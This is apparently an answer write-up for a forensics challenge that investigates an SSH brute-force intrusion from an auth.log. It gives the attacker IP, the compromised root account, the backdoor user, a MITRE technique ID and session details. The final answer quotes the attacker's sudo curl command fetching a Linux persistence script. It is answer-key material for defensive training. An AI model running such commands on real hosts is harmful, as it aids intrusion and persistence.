__Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?__
```bash
65.2.161.68
```

__The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?__
```bash
root
```

__Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?__
```bash
2024-03-06 06:32:45
```

__SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?__
```bash
37
```

__The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?__
```bash
cyberjunkie
```

__What is the MITRE ATT&CK sub-technique ID used for persistence?__
```bash
T1136.001
```

__How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)__
```bash
279
```

__The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?__
```bash
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```